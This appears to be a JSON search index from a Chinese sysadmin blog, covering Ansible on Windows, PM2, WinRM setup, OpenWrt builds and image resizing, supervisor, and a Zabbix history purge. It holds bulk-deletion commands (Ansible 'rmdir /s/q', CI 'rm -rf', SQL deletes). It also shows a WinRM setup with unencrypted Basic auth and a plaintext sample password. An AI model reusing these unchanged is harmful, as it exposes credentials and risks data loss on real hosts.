threshold_warning_repl_delay字段含义：设置主从复制延迟阀值（单位秒）","categories":[],"tags":[{"name":"监控","slug":"监控","permalink":"https://garywu520.github.io/tags/%E7%9B%91%E6%8E%A7/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"monitor","slug":"monitor","permalink":"https://garywu520.github.io/tags/monitor/"}]},{"title":"ansible批量执行windows特殊命令rmdir","slug":"ansible批量执行windows特殊命令rmdir","date":"2020-09-22T12:05:54.000Z","updated":"2020-09-22T12:14:38.796Z","comments":true,"path":"2020/09/22/ansible批量执行windows特殊命令rmdir/","link":"","permalink":"https://garywu520.github.io/2020/09/22/ansible%E6%89%B9%E9%87%8F%E6%89%A7%E8%A1%8Cwindows%E7%89%B9%E6%AE%8A%E5%91%BD%E4%BB%A4rmdir/","excerpt":"ansible批量控制windows执行(ipconfig等) 基本命令是可以正常运行的，但也有例外。 首先，一般情况下，windows命令可以通过where命令查找命令的位置，如： 12&gt; where ipconfigC:\\Windows\\System32\\ipconfig.exe","text":"ansible批量控制windows执行(ipconfig等) 基本命令是可以正常运行的，但也有例外。 首先，一般情况下，windows命令可以通过where命令查找命令的位置，如： 12&gt; where ipconfigC:\\Windows\\System32\\ipconfig.exe 而有些命令却查不到路径, 如： 12345&gt; where rd信息: 用提供的模式无法找到文件。&gt; where rmdir信息: 用提供的模式无法找到文件。 这样的命令，虽然可以在cmd黑框中执行，但并不能使用ansible批量执行。 暂且不明白为什么，如果有知道的，请告诉我 解决方案： 12#如：批量删除D:\\server路径下的test_prod这个整个目录(及目录内子目录+文件)ansible -i /etc/ansible/hosts all -m win_shell -a &quot;cmd.exe /c rmdir /s/q d:\\server\\test_prod&quot;","categories":[],"tags":[{"name":"ansible","slug":"ansible","permalink":"https://garywu520.github.io/tags/ansible/"},{"name":"windows","slug":"windows","permalink":"https://garywu520.github.io/tags/windows/"},{"name":"自动化","slug":"自动化","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"cmd","slug":"cmd","permalink":"https://garywu520.github.io/tags/cmd/"},{"name":"powershell","slug":"powershell","permalink":"https://garywu520.github.io/tags/powershell/"},{"name":"rd","slug":"rd","permalink":"https://garywu520.github.io/tags/rd/"},{"name":"rmdir","slug":"rmdir","permalink":"https://garywu520.github.io/tags/rmdir/"}]},{"title":"windows进程管理工具PM2","slug":"windows进程管理工具PM2","date":"2020-09-21T12:51:18.000Z","updated":"2020-09-21T12:53:14.648Z","comments":true,"path":"2020/09/21/windows进程管理工具PM2/","link":"","permalink":"https://garywu520.github.io/2020/09/21/windows%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7PM2/","excerpt":"1. 前言本来计划在windows上用Python跑supervisor来实现进程管理，但走了一圈，发下pypiwin32模块不起作用。无奈费了牛劲，找到了这个工具，即PM2. 它基于Nodejs实现。 2. PM2安装 下载：Nodejs Windows Binary (.zip) , 并配置环境变量 1$ npm -v 安装pm2 123456#安装pm2$ npm install pm2 -g$ npm install pm2-windows-startup -g#配置pm2工具开机启动$ pm2-startup install","text":"1. 前言本来计划在windows上用Python跑supervisor来实现进程管理，但走了一圈，发下pypiwin32模块不起作用。无奈费了牛劲，找到了这个工具，即PM2. 它基于Nodejs实现。 2. PM2安装 下载：Nodejs Windows Binary (.zip) , 并配置环境变量 1$ npm -v 安装pm2 123456#安装pm2$ npm install pm2 -g$ npm install pm2-windows-startup -g#配置pm2工具开机启动$ pm2-startup install 一旦PM2启动, 自动创建这些文件夹: $HOME/.pm2 will contain all PM2 related files $HOME/.pm2/logs will contain all applications logs $HOME/.pm2/pids will contain all applications pids $HOME/.pm2/pm2.log PM2 logs $HOME/.pm2/pm2.pid PM2 pid $HOME/.pm2/rpc.sock Socket file for remote commands $HOME/.pm2/pub.sock Socket file for publishable events $HOME/.pm2/conf.js PM2 Configuration 添加bat程序开机启动 12$ pm2 start D:\\scripts\\temp_file2.bat --interpreter none --name &quot;ws&quot;$ pm2 save 3. 日常操作 查看 1234567891011#打印所有进程$ pm2 list|ls|status#打印所有进程-Json格式$ pm2 jlist#打印所有进程资源监控$ pm2 monit#基于Web的诊断系统$pm2 plus 停止/启动/重启 1234567891011#停止所有进程$ pm2 stop all#重启所有进程$ pm2 restart all#启动/停止/重启单个进程$ pm2 start/stop/restart [id]#进程重新加载$ pm2 reload all 日志 1234567891011#查看指定进程日志$ pm2 logs ws #查看所有进程日志$ pm2 logs#刷新[清空]所有log文件$ pm2 flush#reload所有log文件$ pm2 reloadLogs 删除进程 12# ID是指：PM2中的进程ID$ pm2 delete [ID] 其他 12#升级$ pm2 updatePM2 4. 使用范例123$ pm2 start D:\\xxx\\bin\\htan.exe --name &quot;htan&quot; --output --error --log D:\\xxx\\bin\\htan_output_&quot;%date:/=-%&quot;_&quot;%time::=.%&quot;.txt$ pm2 save 其他参数：–no-autorestart，加了此参数重启机器，进程不会启动","categories":[],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://garywu520.github.io/tags/nodejs/"},{"name":"supervisor","slug":"supervisor","permalink":"https://garywu520.github.io/tags/supervisor/"},{"name":"pm2","slug":"pm2","permalink":"https://garywu520.github.io/tags/pm2/"},{"name":"win进程管理","slug":"win进程管理","permalink":"https://garywu520.github.io/tags/win%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}]},{"title":"Ansible自动化管理win 2016","slug":"Ansible自动化管理win-2016","date":"2020-09-17T12:21:11.000Z","updated":"2020-09-17T12:39:44.777Z","comments":true,"path":"2020/09/17/Ansible自动化管理win-2016/","link":"","permalink":"https://garywu520.github.io/2020/09/17/Ansible%E8%87%AA%E5%8A%A8%E5%8C%96%E7%AE%A1%E7%90%86win-2016/","excerpt":"关于批量管理windows，踩了不少坑，后来随着研究不断深入。梳理下来，其实不算复杂。 目的及思路：管理机(Linux)使用Ansible管理windows, 尤其是远程执行bat脚本 环境管理机Python版本要求：≥3.6","text":"关于批量管理windows，踩了不少坑，后来随着研究不断深入。梳理下来，其实不算复杂。 目的及思路：管理机(Linux)使用Ansible管理windows, 尤其是远程执行bat脚本 环境管理机Python版本要求：≥3.6 1. 管理机Linux操作 安装Python3，略 ansible必须使用pip来安装，否则会报如下错误 “msg”: “winrm or requests is not installed: No module named winrm” 安装pip命令 123456#从官网下载pip包到本地，官网链接：https://pypi.org/project/pip/#fileswget https://files.pythonhosted.org/packages/8e/76/66066b7bc71817238924c7e4b448abdb17eb0c92d645769c223f9ace478f/pip-20.0.2.tar.gztar -zxvf pip-20.0.2.tar.gz -C /usr/localcd /usr/local/pip-20.0.2python3 setup.py install 1234#安装pywinrm$ pip3 install ansible$ pip3 install cryptography$ pip3 install pywinrm 123#创建ansible工作目录mkdir -p /etc/ansibletouch /etc/ansible/hosts 2. Win Server 2016操作 注：以下操作需要PowerShell以管理员身份运行 1234567::确认powershell版本$Host.Version::或(Get-Host).Version::可以看到windows server 2016的powershell版本为5.1::查看已安装的.net版本(目前.net版本是4.7)(Get-ItemProperty &#x27;HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Client&#x27; -Name Version).Version 更改powerShell的策略为remotesigned，否则运行不了powerShell脚本文件 12345get-executionpolicy::如果默认不是remotesigned，按照如下方式修改set-executionpolicy remotesignedget-executionpolicy 配置Winrm 123456789::配置并启动winrmwinrm quickconfig::不提示完成快速配置并确认winrm quickconfig -transport:http -q -force::设置相关的配置winrm set winrm/config/service &#x27;@&#123;AllowUnencrypted=&quot;true&quot;&#125;&#x27;winrm set winrm/config/service/auth &#x27;@&#123;Basic=&quot;true&quot;&#125;&#x27;winrm get winrm/config 3. Ansible管理机-使用示例1cd /etc/ansible cat hosts 1234567891011121314[windows]10.11.1.10[seg]10.11.1.11......[all:vars]ansible_ssh_user=Administratoransible_ssh_pass=&quot;123456&quot;ansible_ssh_port=5985ansible_connection=&quot;winrm&quot;ansible_winrm_server_cert_validation=ignore ansible_winrm_transport=basic 执行脚本测试 1ansible -i /etc/ansible/hosts windows -m win_ping 远程执行cmd命令或bat脚本 1ansible -i /etc/ansible/hosts all -m win_shell -a &#x27;D:\\scripts\\test.bat&#x27; 4. 其他常用命令12#文件批量分发---通过ansible批量(若目标存在同名文件，则自动覆盖)发送到所有主机ansible all -m win_copy -a &quot;src=/etc/ansible/scripts/mysql_export.bat dest=d:/scripts/mysql_export.bat&quot; 5. 错误解决 错误1：”msg”: “winrm or requests is not installed: No module named winrm” 123#原因：用yum安装ansible无法调用pip安装的pywinrm插件#--#解决方案：卸载yum安装的ansible，使用pip安装ansible 错误2：plaintext: the specified credentials were rejected by the server 1检查windows账号密码是否正确，我这里是因为密码错误导致的 错误3：bat脚本在服务器上直接运行正常，但从ansible运行bat报错：Access is denied(访问拒绝) 1234并非某个命令没有执行权限，而是因为脚本中，存在变量取值异常导致命令执行错误的问题。需要在脚本中打断点(echo变量，逐一确认是否正常)验证。有个案例是：时间取值windows执行正常，ansible执行出错而导致此错误。解决方法是重新配置时间变量。","categories":[],"tags":[{"name":"ansible","slug":"ansible","permalink":"https://garywu520.github.io/tags/ansible/"},{"name":"windows","slug":"windows","permalink":"https://garywu520.github.io/tags/windows/"},{"name":"Ansible自动化","slug":"Ansible自动化","permalink":"https://garywu520.github.io/tags/Ansible%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"编译安装htop3.0","slug":"编译安装htop3-0","date":"2020-09-16T13:13:53.000Z","updated":"2020-09-16T13:45:13.019Z","comments":true,"path":"2020/09/16/编译安装htop3-0/","link":"","permalink":"https://garywu520.github.io/2020/09/16/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85htop3-0/","excerpt":"Github项目Realease：https://github.com/hishamhm/htop/releases 安装编译环境+依赖123yum groupinstall “Development Tools” -yyum install glibc-devel glibc-headers kernel-headers kernel-devel gnutls-develyum install -y ncurses-devel","text":"Github项目Realease：https://github.com/hishamhm/htop/releases 安装编译环境+依赖123yum groupinstall “Development Tools” -yyum install glibc-devel glibc-headers kernel-headers kernel-devel gnutls-develyum install -y ncurses-devel 编译htop3.01234wget https://github.com/hishamhm/htop/archive/3.0.0beta5.tar.gztar -xvzf 3.0.0beta5.tar.gzcd htop-3.0.0beta5/./autogen.sh &amp;&amp; ./configure &amp;&amp; make 123$ ./htop -vhtop 3.0.0beta5 - (C) 2004-2020 Hisham MuhammadReleased under the GNU GPL. 1234which htopmv /usr/bin/htop /usr/bin/htop.bakcp ./htop /usr/bin/htopls -lh /usr/bin/htop","categories":[],"tags":[{"name":"htop","slug":"htop","permalink":"https://garywu520.github.io/tags/htop/"},{"name":"htop3","slug":"htop3","permalink":"https://garywu520.github.io/tags/htop3/"}]},{"title":"supervisor启动mysql","slug":"supervisor启动mysql","date":"2020-09-10T03:29:17.000Z","updated":"2020-09-10T03:33:10.865Z","comments":true,"path":"2020/09/10/supervisor启动mysql/","link":"","permalink":"https://garywu520.github.io/2020/09/10/supervisor%E5%90%AF%E5%8A%A8mysql/","excerpt":"","text":"supervisor管理启动mysql 1234567891011[program:mysqld_3307]command=/bin/pidproxy /data/mysql_3307_v5.6.28/mysqld_3307.pid /usr/local/mysql-5.6.28/bin/mysqld_safe --defaults-file=/etc/my_3307.cnf --pid-file=/data/mysql_3307_v5.6.28/mysqld_3307.pidstdout_logfile=/var/log/mysqld_3307.logstderr_logfile=/var/log/mysqld_3307.loguser=mysqlautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true pidproxy命令隶属于supervisor包","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"supervisor","slug":"supervisor","permalink":"https://garywu520.github.io/tags/supervisor/"}]},{"title":"ESXI双网卡openwrt配置并扩容","slug":"ESXI双网卡openwrt配置并扩容","date":"2020-09-05T14:12:02.000Z","updated":"2020-09-10T03:43:56.267Z","comments":true,"path":"2020/09/05/ESXI双网卡openwrt配置并扩容/","link":"","permalink":"https://garywu520.github.io/2020/09/05/ESXI%E5%8F%8C%E7%BD%91%E5%8D%A1openwrt%E9%85%8D%E7%BD%AE%E5%B9%B6%E6%89%A9%E5%AE%B9/","excerpt":"环境 PC电脑一台 PC新增PCI千兆网卡1块 安装完ESXI6.5[打入RTL8111e网卡驱动版]","text":"环境 PC电脑一台 PC新增PCI千兆网卡1块 安装完ESXI6.5[打入RTL8111e网卡驱动版] 一、ESXI 双网卡设置 一、ESXI Web —&gt; 网络 —&gt; 虚拟交换机(默认只有一个vSwitch0) 编辑vSwitch0 —&gt; 安全 —&gt; 勾选：混杂模式(接受) + MAC地址更改(接受) + 伪传输(接受) 由于，这台PC有2块网卡，所以我们需要再添加一个虚拟交换机，这里名称为VMLan, 同样，安全里面，都接受 混杂模式+MAC地址更改 + 伪传输 二、ESXI Web —&gt;网络 —&gt; 端口组 编辑默认的”VM Network” —&gt; 安全 —&gt; 勾选：混杂模式(接受) + MAC地址更改(接受) + 伪传输(接受) 编辑默认的”Management Network” —&gt; 安全 —&gt; 勾选：混杂模式(接受) + MAC地址更改(接受) + 伪传输(接受) 新增一个“VMLAN”的端口组 —&gt; 安全 —&gt; 勾选：混杂模式(接受) + MAC地址更改(接受) + 伪传输(接受) 三、虚拟机添加双网卡 创建虚拟机的时候或给运行的虚拟机热添加双网卡即可。注：Linux需要新增网卡配置文件，并重启网络服务 二、新增虚拟机OpenWRT 转换适用于ESXI Server的vmdk镜像，转换后有2个vmdk，都导入到ESXI中即可。 导入openwrt vmdk镜像： 使用添加现有硬盘，默认镜像大小显示为177MB，可以手动改为10G(为了后边空间扩容) 硬盘设备节点，从SCSI改为IDE，磁盘模式：独立 · 持久 网卡新增一块用于VMLAN 启动虚拟机 启动后，修改LAN网络 12345#vim /etc/config/network#把LAN IP段从192.168.1.1/24改为10.10.10.1/24#而WAN IP段DHCP保持默认即可，如果上游为拨号，则登录OpenWRT Web中修改#重启网卡或重启openwrt/etc/init.d/network restart 到此为止，openwrt已经可以正常上网了，Windows客户端使用DHCP即可获得10.10.10.0/24的IP分配 三、OpenWRT扩容伪设备挂载 首先，通过github源码自行编译，然后将下载的img上传到linux机器上，追加空白容量到镜像末端 12#我准备追加10GBdd if=/dev/zero bs=1M count=10240 &gt;&gt;openwrt-x86-64-generic-squashfs-combined.img 把镜像虚拟成一个伪设备 12losetup -flosetup /dev/loop0 openwrt-x86-64-generic-squashfs-combined.img 接下来 /dev/loop0 就如同一个真实挂载的硬盘一样了 使用 fdisk 修改分区，把未分配空间也并入原本的第二个分区中。而所谓并入，则等于删除旧分区，再重新创建分区。创建新分区的时候，要保证它的开始扇区和旧分区保持一致 1234#先使用p查看第二分区的起始扇区fdisk /dev/loop0# 这里起始扇区为：33792 使用 d 删除第二分区，再用 n 新建一个分区，起始于33792扇区，并把后面追加的几百 Mb 空间都包含进去，最后 w 写入更改。 接下来使用kpartx挂载虚拟磁盘 1kpartx -a /dev/loop0 执行后磁盘会被挂载到 /dev/mapper/loop0p1 和 /dev/mapper/loop0p2下，后者就是刚才的分区了 用fsck对/dev/mapper/loop0p2进行检查，以免出现不可预料的问题 12#检查fsck -f /dev/mapper/loop0p2 使用resize2fs调整大小**[实际操作出现错误-跳过]** 1resize2fs /dev/mapper/loop0p2 最后，使用StarWind V2V Image Converter转换成虚拟机vmdk格式 附录：ESXI运行WinPE鼠标无法使用-解决方法 openwrt虚拟机设置中，需要添加USB控制器 使用VMware Remote Console (VMRC)方式打开","categories":[],"tags":[{"name":"ESXI","slug":"ESXI","permalink":"https://garywu520.github.io/tags/ESXI/"},{"name":"openwrt","slug":"openwrt","permalink":"https://garywu520.github.io/tags/openwrt/"},{"name":"overlay扩容","slug":"overlay扩容","permalink":"https://garywu520.github.io/tags/overlay%E6%89%A9%E5%AE%B9/"},{"name":"扩容","slug":"扩容","permalink":"https://garywu520.github.io/tags/%E6%89%A9%E5%AE%B9/"}]},{"title":"openwrt云编译","slug":"openwrt云编译","date":"2020-08-15T04:15:58.000Z","updated":"2020-08-15T06:18:57.024Z","comments":true,"path":"2020/08/15/openwrt云编译/","link":"","permalink":"https://garywu520.github.io/2020/08/15/openwrt%E4%BA%91%E7%BC%96%E8%AF%91/","excerpt":"1. Fork Lede源码 fork lede 源码：https://github.com/coolsnowwolf/lede fork GitHub Actions自动编译源码：https://github.com/KFERMercer/OpenWrt-CI","text":"1. Fork Lede源码 fork lede 源码：https://github.com/coolsnowwolf/lede fork GitHub Actions自动编译源码：https://github.com/KFERMercer/OpenWrt-CI 2. 载入插件源在garywu520/lede**仓库下面，编辑：feeds.conf.default**文件，加入大神碉堡的插件源，保存 1234src-git kenzo https://github.com/kenzok8/openwrt-packages#这个是passwall依赖src-git small https://github.com/kenzok8/small garywu520/lede/.github/workflows/目录，编辑openwrt-ci.yml文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214## This is free software, lisence use MIT.# # Copyright (C) 2019 P3TERX &lt;https://p3terx.com&gt;# Copyright (C) 2019 KFERMercer &lt;KFER.Mercer@gmail.com&gt;# # &lt;https://github.com/KFERMercer/OpenWrt-CI&gt;#name: OpenWrt-CIon: push: branches: - master schedule: - cron: 0 20 * * * # release: # types: [published]jobs: build_openwrt: name: Build OpenWrt runs-on: ubuntu-latest if: github.event.repository.owner.id == github.event.sender.id steps: - name: Checkout uses: actions/checkout@master with: ref: master - name: Space cleanup env: DEBIAN_FRONTEND: noninteractive run: | docker rmi `docker images -q` sudo rm -rf /usr/share/dotnet /etc/mysql /etc/php /etc/apt/sources.list.d sudo -E apt-get -y purge azure-cli ghc* zulu* hhvm llvm* firefox google* dotnet* powershell openjdk* mysql* php* sudo -E apt-get update sudo -E apt-get -y install build-essential asciidoc binutils bzip2 gawk gettext git libncurses5-dev libz-dev patch python3 unzip zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs gcc-multilib g++-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler antlr3 gperf sudo -E apt-get -y autoremove --purge sudo -E apt-get clean # sudo mkdir -p -m 777 /mnt/openwrt/bin /mnt/openwrt/build_dir/host /mnt/openwrt/build_dir/hostpkg /mnt/openwrt/dl /mnt/openwrt/feeds /mnt/openwrt/staging_dir # ln -s /mnt/openwrt/bin ./bin # mkdir -p ./build_dir/host &amp;&amp; ln -s /mnt/openwrt/build_dir/host ./build_dir/host # mkdir -p ./build_dir/host &amp;&amp; ln -s /mnt/openwrt/build_dir/hostpkg ./build_dir/hostpkg # ln -s /mnt/openwrt/dl ./dl # ln -s /mnt/openwrt/feeds ./feeds # ln -s /mnt/openwrt/staging_dir ./staging_dir df -h - name: Update feeds run: | ./scripts/feeds update -a ./scripts/feeds install -a - name: Generate configuration file run: | rm -f ./.config* touch ./.config # # ========================固件定制部分======================== # # # 如果不对本区块做出任何编辑, 则生成默认配置固件. # # 以下为定制化固件选项和说明: # # # 有些插件/选项是默认开启的, 如果想要关闭, 请参照以下示例进行编写: # # ========================================= # | # 取消编译VMware镜像: | # | cat &gt;&gt; .config &lt;&lt;EOF | # | # CONFIG_VMDK_IMAGES is not set | # | EOF | # ========================================= # # # 以下是一些提前准备好的一些插件选项. # 直接取消注释相应代码块即可应用. 不要取消注释代码块上的汉字说明. # 如果不需要代码块里的某一项配置, 只需要删除相应行. # # 如果需要其他插件, 请按照示例自行添加. # 注意, 只需添加依赖链顶端的包. 如果你需要插件 A, 同时 A 依赖 B, 即只需要添加 A. # # 无论你想要对固件进行怎样的定制, 都需要且只需要修改 EOF 回环内的内容. # # 编译x64固件: cat &gt;&gt; .config &lt;&lt;EOF CONFIG_TARGET_x86=y CONFIG_TARGET_x86_64=y CONFIG_TARGET_x86_64_Generic=y EOF # 固件压缩: cat &gt;&gt; .config &lt;&lt;EOF CONFIG_TARGET_IMAGES_GZIP=y EOF # 编译UEFI固件: cat &gt;&gt; .config &lt;&lt;EOF CONFIG_EFI_IMAGES=y EOF # IPv6支持: cat &gt;&gt; .config &lt;&lt;EOF CONFIG_PACKAGE_dnsmasq_full_dhcpv6=y CONFIG_PACKAGE_ipv6helper=y EOF # 多文件系统支持: cat &gt;&gt; .config &lt;&lt;EOF CONFIG_PACKAGE_kmod-fs-nfs=y CONFIG_PACKAGE_kmod-fs-nfs-common=y CONFIG_PACKAGE_kmod-fs-nfs-v3=y CONFIG_PACKAGE_kmod-fs-nfs-v4=y CONFIG_PACKAGE_kmod-fs-ntfs=y CONFIG_PACKAGE_kmod-fs-squashfs=y EOF # USB3.0支持: cat &gt;&gt; .config &lt;&lt;EOF CONFIG_PACKAGE_kmod-usb-ohci=y CONFIG_PACKAGE_kmod-usb-ohci-pci=y CONFIG_PACKAGE_kmod-usb2=y CONFIG_PACKAGE_kmod-usb2-pci=y CONFIG_PACKAGE_kmod-usb3=y EOF # 常用LuCI插件选择: cat &gt;&gt; .config &lt;&lt;EOF CONFIG_PACKAGE_luci-app-adbyby-plus=y CONFIG_PACKAGE_luci-app-aria2=y CONFIG_PACKAGE_luci-app-baidupcs-web=y CONFIG_PACKAGE_luci-app-docker=y CONFIG_PACKAGE_luci-app-frpc=y CONFIG_PACKAGE_luci-app-kodexplorer=y CONFIG_PACKAGE_luci-app-minidlna=y CONFIG_PACKAGE_luci-app-openvpn=y CONFIG_PACKAGE_luci-app-openvpn-server=y CONFIG_PACKAGE_luci-app-qbittorrent=y CONFIG_PACKAGE_luci-app-ssr-plus_INCLUDE_Kcptun=y CONFIG_PACKAGE_luci-app-ssr-plus_INCLUDE_Shadowsocks=y CONFIG_PACKAGE_luci-app-ssr-plus_INCLUDE_ShadowsocksR_Server=y CONFIG_PACKAGE_luci-app-ssr-plus_INCLUDE_ShadowsocksR_Socks=y CONFIG_PACKAGE_luci-app-ssr-plus_INCLUDE_V2ray=y CONFIG_PACKAGE_luci-app-ttyd=y CONFIG_PACKAGE_luci-app-v2ray-server=y CONFIG_PACKAGE_luci-app-verysync=y CONFIG_PACKAGE_luci-app-webadmin=y CONFIG_PACKAGE_luci-app-wireguard=y CONFIG_PACKAGE_luci-app-wrtbwmon=y CONFIG_PACKAGE_luci-app-passwall=y CONFIG_PACKAGE_luci-app-smartdns=y CONFIG_PACKAGE_luci-app-gost=y CONFIG_PACKAGE_luci-app-advancedsetting=y CONFIG_PACKAGE_luci-app-openclash=y EOF # LuCI主题: cat &gt;&gt; .config &lt;&lt;EOF CONFIG_PACKAGE_luci-theme-argon=y CONFIG_PACKAGE_luci-theme-netgear=y CONFIG_PACKAGE_luci-theme-argon_new=y CONFIG_PACKAGE_luci-theme-atmaterial=y CONFIG_PACKAGE_luci-theme-opentomcat=y CONFIG_PACKAGE_luci-theme-opentomato=y EOF # 常用软件包: cat &gt;&gt; .config &lt;&lt;EOF CONFIG_PACKAGE_curl=y CONFIG_PACKAGE_htop=y CONFIG_PACKAGE_nano=y CONFIG_PACKAGE_screen=y CONFIG_PACKAGE_tree=y CONFIG_PACKAGE_vim-fuller=y CONFIG_PACKAGE_wget=y EOF # 取消编译VMware镜像以及镜像填充 (不要删除被缩进的注释符号): # cat &gt;&gt; .config &lt;&lt;EOF # # CONFIG_TARGET_IMAGES_PAD is not set # # CONFIG_VMDK_IMAGES is not set # EOF # # ========================固件定制部分结束======================== # sed -i &#x27;s/^[ \\t]*//g&#x27; ./.config make defconfig - name: Make download run: | make download -j8 || make download -j1 V=s find ./dl/ -size -1024c -exec rm -f &#123;&#125; \\; df -h - name: Compile firmware run: | make -j$(nproc) || make -j1 V=s echo &quot;=======================&quot; echo &quot;Space usage:&quot; echo &quot;=======================&quot; df -h echo &quot;=======================&quot; du -h ./ --max-depth=1 du -h /mnt/openwrt/ --max-depth=1 || true - name: Prepare artifact run: find ./bin/targets/ -type d -name &quot;packages&quot; | xargs rm -rf &#123;&#125; - name: Upload config.seed uses: actions/upload-artifact@master with: name: config.seed path: ./bin/targets/*/*/config.seed - name: Upload firmware uses: actions/upload-artifact@master with: name: OpenWrt_firmware path: ./bin/targets/ 最新LuCI插件列表参考：https://github.com/kenzok8/openwrt-packages 3. 云编译步骤二中的openwrt-ci.yml文件保存提交后，GitHub Action云编译就自动工作了，可以在这里看到： 等待时间约2小时编译完成，之后固件就可以下载了","categories":[],"tags":[]},{"title":"zabbix历史数据清理","slug":"zabbix历史数据清理","date":"2020-08-14T14:25:16.000Z","updated":"2020-08-15T03:03:01.594Z","comments":true,"path":"2020/08/14/zabbix历史数据清理/","link":"","permalink":"https://garywu520.github.io/2020/08/14/zabbix%E5%8E%86%E5%8F%B2%E6%95%B0%E6%8D%AE%E6%B8%85%E7%90%86/","excerpt":"停止zabbix-server服务 12#停止zabbix-server服务是停止向数据库写入数据，因为在数据清理优化过程中，mysql会锁表。systemctl stop zabbix-server 1. 时间戳转换123#取60天之前的时间戳$ date -d $(date -d &quot;-60 day&quot; +%Y%m%d) +%s1592150400","text":"停止zabbix-server服务 12#停止zabbix-server服务是停止向数据库写入数据，因为在数据清理优化过程中，mysql会锁表。systemctl stop zabbix-server 1. 时间戳转换123#取60天之前的时间戳$ date -d $(date -d &quot;-60 day&quot; +%Y%m%d) +%s1592150400 2. 数据清理123456789$mysql -uzabbix -puse zabbix;delete from history_uint where clock &lt; 1592150400;alter table history_uint ENGINE = &#x27;InnoDB&#x27;;delete from history where clock &lt; 1592150400;alter table history ENGINE = &#x27;InnoDB&#x27;;#注意：在alter table用来优化并释放表空间。#但要注意的是，它在运行过程中，MySQL会锁定表，所以应该考虑使用一些运维手段避免现网的服务受到影响。 2. 重启zabbix和nginx服务123systemc restart mysqldsystemctl restart zabbix-serversystemctl restart nginx 错误处理 Error 1206 The total number of locks exceeds the lock table size. 解决方案： 1show variables like &quot;%_buffer%&quot;; vim /etc/my.cnf 123#默认8MB,改为2GB(太小了还是会报错)[mysqld]innodb_buffer_pool_size=2048MB 重启mysql","categories":[],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"unix","slug":"unix","permalink":"https://garywu520.github.io/tags/unix/"}]},{"title":"openwrt安装配置supervisor","slug":"openwrt安装配置supervisor","date":"2020-08-08T07:13:57.000Z","updated":"2020-08-08T07:16:36.168Z","comments":true,"path":"2020/08/08/openwrt安装配置supervisor/","link":"","permalink":"https://garywu520.github.io/2020/08/08/openwrt%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEsupervisor/","excerpt":"1. 安装Python-PIP1234opkg updateopkg install python3-pip/usr/bin/python3 -m pip install --upgrade pippip install supervisor supervisor安装完成后，会在/usr/bin/目录生成3个可执行文件 1234$ ls -lh /usr/bin/*supervisor*-rwxr-xr-x 1 root root 218 Aug 8 14:46 /usr/bin/echo_supervisord_conf-rwxr-xr-x 1 root root 223 Aug 8 14:46 /usr/bin/supervisorctl-rwxr-xr-x 1 root root 221 Aug 8 14:46 /usr/bin/supervisord","text":"1. 安装Python-PIP1234opkg updateopkg install python3-pip/usr/bin/python3 -m pip install --upgrade pippip install supervisor supervisor安装完成后，会在/usr/bin/目录生成3个可执行文件 1234$ ls -lh /usr/bin/*supervisor*-rwxr-xr-x 1 root root 218 Aug 8 14:46 /usr/bin/echo_supervisord_conf-rwxr-xr-x 1 root root 223 Aug 8 14:46 /usr/bin/supervisorctl-rwxr-xr-x 1 root root 221 Aug 8 14:46 /usr/bin/supervisord 2. 生成supervisor配置文件123mkdir -p /etc/supervisor/conf.dcd /etc/supervisor//usr/bin/echo_supervisord_conf &gt; ./supervisord.conf supervisor目录结构： 1234root@OpenWrt:/etc/supervisor# tree.├── conf.d└── supervisord.conf 3. 修改supervisor配置文件123#配置外部文件加载路径[include]files = /etc/supervisor/conf.d/*.conf 配置supervisor开机启动脚本 cat /etc/init.d/supervisord 123456789101112131415161718192021222324#!/bin/sh /etc/rc.common# Start/stop/restart supervisor in OpenWrt.START=91USE_PROCD=0PROG=/usr/bin/supervisordDAEMON=$&#123;PROG&#125;# Location of the pid filePIDFILE=/tmp/supervisord.pid# Config of supervisorCONFIG=/etc/supervisor/supervisord.confstart_service()&#123; # $DAEMON -c $CONFIG -j $PIDFILE procd_open_instance procd_set_param command $PROG -c $CONFIG -j $PIDFILE procd_set_param respawn procd_close_instance touch $CONFIG&#125;stop_service()&#123; kill $(cat $PIDFILE)&#125; 4. 自启supervisor12chmod +x /etc/init.d/supervisord/etc/init.d/supervisord enable","categories":[],"tags":[{"name":"openwrt","slug":"openwrt","permalink":"https://garywu520.github.io/tags/openwrt/"},{"name":"supervisor","slug":"supervisor","permalink":"https://garywu520.github.io/tags/supervisor/"}]},{"title":"OpenWRT安装及扩容","slug":"OpenWRT安装及扩容","date":"2020-08-08T03:37:58.000Z","updated":"2020-08-08T04:03:52.772Z","comments":true,"path":"2020/08/08/OpenWRT安装及扩容/","link":"","permalink":"https://garywu520.github.io/2020/08/08/OpenWRT%E5%AE%89%E8%A3%85%E5%8F%8A%E6%89%A9%E5%AE%B9/","excerpt":"准备： 8G U盘一个 大白菜PE工具 physdiskwrite IMG镜像写入工具(非GUI版本) OpenWRT镜像-获取：TG频道","text":"准备： 8G U盘一个 大白菜PE工具 physdiskwrite IMG镜像写入工具(非GUI版本) OpenWRT镜像-获取：TG频道 一、安装OpenWRT U盘安装大白菜PE 把physdiskwrite 和 OpenWRT 